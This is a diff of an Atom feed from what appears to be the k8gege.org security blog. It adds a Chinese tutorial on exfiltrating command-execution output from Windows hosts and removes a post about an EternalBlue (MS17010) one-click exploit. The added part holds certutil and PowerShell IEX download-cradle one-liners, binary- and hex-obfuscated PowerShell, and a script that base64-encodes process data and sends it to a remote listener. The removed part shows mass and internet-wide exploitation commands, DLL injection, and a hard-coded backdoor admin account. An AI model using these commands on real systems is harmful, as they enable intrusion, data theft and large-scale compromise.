@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2021-05-01T15:42:46.829Z</updated>
+  <updated>2021-05-01T16:28:33.089Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>命令执行漏洞Ladon回显之PowerShell篇</title>
+    <link href="http://k8gege.org/p/cve-2018-14847.html"/>
+    <id>http://k8gege.org/p/cve-2018-14847.html</id>
+    <published>2021-05-01T13:10:00.000Z</published>
+    <updated>2021-05-01T16:28:33.089Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>很多时候命令回显漏洞由于一些特殊原因，无法构造或不方便构造回显，上回讲到JAVA反序列化漏洞Ladon回显方法（<a href="http://k8gege.org/Ladon/web_javarce.html）。本文针对Windows系统实现命令执行漏洞回显方法，使用系统自带certutil或Powershell命令，虽说JAVA跨平台但并不代表所有系统都预装有JAVA，实际上.NET一样是跨平台的，前提都要系统安装才可以，那么对于未安装JAVA的机器或非JAVA程序产生的命令执行漏洞，如何实现命令回显，将是本文讲述的重点。">http://k8gege.org/Ladon/web_javarce.html）。本文针对Windows系统实现命令执行漏洞回显方法，使用系统自带certutil或Powershell命令，虽说JAVA跨平台但并不代表所有系统都预装有JAVA，实际上.NET一样是跨平台的，前提都要系统安装才可以，那么对于未安装JAVA的机器或非JAVA程序产生的命令执行漏洞，如何实现命令回显，将是本文讲述的重点。</a></p><h3 id="启动WEB"><a href="#启动WEB" class="headerlink" title="启动WEB"></a>启动WEB</h3><p>Ladon web 800</p><p>PS: 建议使用8.1以后版本，以免netstat -an等长度过长结果无法接收</p><h3 id="浏览器回显"><a href="#浏览器回显" class="headerlink" title="浏览器回显"></a>浏览器回显</h3><p>直接执行PS1，或向浏览器访问即可看琶Ladon回显BASE64解密结果，就是说我们只要通过命令行发送HTTP请求即可在Ladon控制台看到命令执行后的结果。getstr为发送明文，但是结果中有特殊字符或换行就无法HTTP请求了，所以我们使用BASE64加密，这个原理我们在JAVA反序列化漏洞回显中有提到过。</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/Ladon8.1_web_echo.PNG"></p><h3 id="certutill回显"><a href="#certutill回显" class="headerlink" title="certutill回显"></a>certutill回显</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.43:800/getstr/cve2020</span><br></pre></td></tr></table></figure><h3 id="PowerShell回显"><a href="#PowerShell回显" class="headerlink" title="PowerShell回显"></a>PowerShell回显</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.131:800/debase64/MTIzMTIzMTIzMTIzMTI=')"</span></span><br></pre></td></tr></table></figure><p>执行以上命令，可以在Ladon中得到回显，但是实战中，我们不可能未补先知，直接能返回结果，所以得先执行命令，获取结果转成BASE64后再发送给Ladon解密，所以我们接下来要研究，如何通过powershell执行任意命令并加密发送给Ladon</p><h3 id="查看进程例子"><a href="#查看进程例子" class="headerlink" title="查看进程例子"></a>查看进程例子</h3><h4 id="test-ps1"><a href="#test-ps1" class="headerlink" title="test.ps1"></a>test.ps1</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span>=<span class="built_in">get-process</span>;</span><br><span class="line">echo <span class="variable">$info</span>;</span><br></pre></td></tr></table></figure><p>使用LadonGUI版的编码转换功能将代码转成一行CMD命令，因为命令执行漏洞一般不支持执行多行PS1脚本，经过转换后可以得到命令执行漏洞通用的一行CMD命令。测试发现可以使用Binary或hex等加密将PowerShell代码转成一条命令，以便结合漏洞使用</p><h4 id="Ladon-Base64Command失败"><a href="#Ladon-Base64Command失败" class="headerlink" title="Ladon Base64Command失败"></a>Ladon Base64Command失败</h4><p>提示 =get-process : The term ‘=get-process’ is not recognized as the name of a</p><h4 id="Ladon-Binary成功"><a href="#Ladon-Binary成功" class="headerlink" title="Ladon Binary成功"></a>Ladon Binary成功</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell  -NoP  -NonIntera   <span class="string">"[stRinG]::join( '', ( ( 100100 , 1101001,1101110 , 1100110 ,1101111 , 111101 ,1100111,1100101, 1110100, 101101,1110000,1110010 ,1101111, 1100011,1100101,1110011,1110011 , 111011,1101 ,1010,1100101, 1100011,1101000 ,1101111 ,100000,100100,1101001 , 1101110 ,1100110 ,1101111 ,111011)|fOreAcH-objEct&#123;([convERT]::ToInT16((<span class="variable">$_</span>.TOstRInG()),2) -as [CHAr])&#125;) )| &amp; ((VaRIABle '*MDr*').nAme[3,11,2]-JoIn'')"</span></span><br></pre></td></tr></table></figure><h4 id="Ladon-hex成功"><a href="#Ladon-hex成功" class="headerlink" title="Ladon hex成功"></a>Ladon hex成功</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell   -NonInteract  -NoProfi     <span class="string">"('24S69k6e!66!6f!3dU67!65h74-2dS70S72O6f;63O65k73S73;3b;d!a-65-63!68;6f!20k24h69;6ek66h6fU3b'.sPLIt( 'UOh-;!kS' ) | FOreaCh-objECt&#123; ( [chAR]( [cONVerT]::TOInt16( ( [STRinG]<span class="variable">$_</span> ) ,16))) &#125; ) -JOiN '' | . ( <span class="variable">$eNv</span>:comSPeC[4,15,25]-JoiN'')"</span></span><br></pre></td></tr></table></figure><h3 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span>=<span class="built_in">get-process</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$env:username</span></span><br><span class="line">echo <span class="variable">$info</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bytes</span>  = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$info</span>)</span><br><span class="line"><span class="variable">$b64</span> = [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">echo <span class="variable">$b64</span>.Replace(<span class="string">"="</span>,<span class="string">"%3d"</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$webClient</span> = <span class="built_in">New-Object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$webClient</span>.DownloadString(<span class="string">'http://192.168.1.18:800/debase64/'</span>+<span class="variable">$b64</span>)</span><br></pre></td></tr></table></figure><p>PS：查看其它命令，可以自行修改</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/Ladon8.1_ps1_hex.PNG"></p><h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><h4 id="LadonGo-ALL-OS"><a href="#LadonGo-ALL-OS" class="headerlink" title="LadonGo (ALL OS)"></a>LadonGo (ALL OS)</h4><p><a href="https://github.com/k8gege/LadonGo/releases" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo/releases</a></p><h4 id="Ladon-Windows-amp-Cobalt-Strike"><a href="#Ladon-Windows-amp-Cobalt-Strike" class="headerlink" title="Ladon (Windows &amp; Cobalt Strike)"></a>Ladon (Windows &amp; Cobalt Strike)</h4><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.1版本：K8小密圈</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;很多时候命令回显漏洞由于一些特殊原因，无法构造或不方便构造回显，上回讲到JAVA反序列化漏洞Ladon回显方法（&lt;a href=&quot;http:
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="命令执行" scheme="http://k8gege.org/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
   
   <entry>
     <title>〖EXP〗CVE-2018-14847 RouterOS Exploit</title>
@@ -547,34 +573,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
       <category term="netcat" scheme="http://k8gege.org/tags/netcat/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>〖EXP〗NSA MS17010永恒之蓝漏洞一键工具</title>
-    <link href="http://k8gege.org/p/k8ms17010exp.html"/>
-    <id>http://k8gege.org/p/k8ms17010exp.html</id>
-    <published>2020-12-17T15:00:00.000Z</published>
-    <updated>2021-01-17T08:43:46.881Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>无损检测，不会对目标造成任何危害，大家无需担心</p><p>Ladon 192.168.1.8 MS17010<br>Ladon 192.168.1.8/24 MS17010<br>Ladon 192.168.1.8/c MS17010</p><p>检测发现存在漏洞高亮显示<br><img alt="image" data-original="https://s2.ax1x.com/2020/01/12/lTg0Hg.gif"></p><h3 id="独立使用"><a href="#独立使用" class="headerlink" title="独立使用"></a>独立使用</h3><p>只需提供IP或IP列表即可自动利用永恒之蓝,当然也可以使用Ladon来批量甚至全网</p><p>PS: 由于当时漏洞影响很大，所以并未放出一键批量工具，现在4年过去了，还没打补丁就只能建议开除维护人员了，工具调用的是NSA原版的EXP，所以整个SMBSCAN目录里的文件基本上都是被杀的，这就不方便集成在Ladon里，以免Ladon被所有杀软杀。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop\SmbExp&gt;ksmb 192.168.1.89</span><br><span class="line">MS17010-EXP ETERNALBLUE by K8gege</span><br><span class="line"></span><br><span class="line">IP:  192.168.1.89</span><br><span class="line">OS:  64-bit 6.1 build 7601     Windows 2008 R2 Enterprise 7601 SP 1</span><br><span class="line">VUL: 3 (ETERNALBLUE     - DANE  ETERNALROMANCE  - FB    ETERNALCHAMPION - DANE/F</span><br><span class="line">B)</span><br><span class="line">EXP: Use Eternalblue &amp; Doublepulsar</span><br><span class="line">DLL: x64 Payload Injected</span><br></pre></td></tr></table></figure><h4 id="只IP默认445端口"><a href="#只IP默认445端口" class="headerlink" title="只IP默认445端口"></a>只IP默认445端口</h4><p>ksmb 192.168.1.89</p><h4 id="自定义端口"><a href="#自定义端口" class="headerlink" title="自定义端口"></a>自定义端口</h4><p>ksmb 192.168.1.89 445<br>适用于代理出来打，不用考虑做免杀，而且免杀一堆文件也很麻烦</p><h4 id="自定义DLL"><a href="#自定义DLL" class="headerlink" title="自定义DLL"></a>自定义DLL</h4><p>ksmb 192.168.1.89 445 mydll.dll</p><h4 id="注入指定进程"><a href="#注入指定进程" class="headerlink" title="注入指定进程"></a>注入指定进程</h4><p>ksmb 192.168.1.89 445 mydll.dll explorer.exe</p><h3 id="Ladon调用"><a href="#Ladon调用" class="headerlink" title="Ladon调用"></a>Ladon调用</h3><p>使用Ladon可轻松批量使用自己的POC，即只需要实现一个功能，剩下交给Ladon，不用每次来什么新洞都得浪费时间写批量利用工具。除了花一堆时间调式EXP，还得把它弄成批量，批量又得考虑多线程是否兼容POC里的代码等等问题，等写完时效性都过了。Ladon可批量主机、批量URL、批量网段、全网等等，非常方便，下面就是调用ms17010exp的例子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop\SmbExp&gt;Ladon 192.168.1.89 ksmb.exe</span><br><span class="line">Ladon 7.5</span><br><span class="line">Start: 2020-12-17 23:40:16</span><br><span class="line">Runtime: .net 2.0  ME: x64 OS: x64</span><br><span class="line">OS Name: Microsoft Windows 8.1 Enterprise</span><br><span class="line">RunUser: k8gege PR: -IsUser</span><br><span class="line">PID: 5804  CurrentProcess: Ladon</span><br><span class="line"></span><br><span class="line">Call DiyMoudle (c<span class="comment"># exe)</span></span><br><span class="line">load ksmb.exe</span><br><span class="line">ICMP: 192.168.1.89      00-0C-29-CF-FE-E1       VMware</span><br><span class="line">MS17010-EXP ETERNALBLUE by K8gege</span><br><span class="line"></span><br><span class="line">IP:  192.168.1.89</span><br><span class="line">OS:  64-bit 6.1 build 7601     Windows 2008 R2 Enterprise 7601 SP 1</span><br><span class="line">VUL: 3 (ETERNALBLUE     - DANE  ETERNALROMANCE  - FB    ETERNALCHAMPION - DANE/F</span><br><span class="line">B)</span><br><span class="line">EXP: Use Eternalblue &amp; Doublepulsar</span><br><span class="line">DLL: x64 Payload Injected</span><br></pre></td></tr></table></figure><h4 id="批量利用"><a href="#批量利用" class="headerlink" title="批量利用"></a>批量利用</h4><p>Ladon 192.168.1.89/c ksmb.exe<br>Ladon 192.168.1.89/24 ksmb.exe</p><h4 id="全网扫描"><a href="#全网扫描" class="headerlink" title="全网扫描"></a>全网扫描</h4><p>Ladon 0.0.0.0-255.255.255.255 ksmb.exe</p><h3 id="成功结果"><a href="#成功结果" class="headerlink" title="成功结果"></a>成功结果</h3><p>自带DLL会添加以下管理员用户<br>k8ms17010exp K8gege520!@#</p><p>可替换DLL，执行自定义功能</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/MS17010_EXP.PNG"></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>EXP小密圈内下载</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h3&gt;&lt;p&gt;永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒
-      
-    
-    </summary>
-    
-    
-      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
-    
-      <category term="CVE-2020-17144" scheme="http://k8gege.org/tags/CVE-2020-17144/"/>
-    
-      <category term="MS17010" scheme="http://k8gege.org/tags/MS17010/"/>
     
   </entry>
   
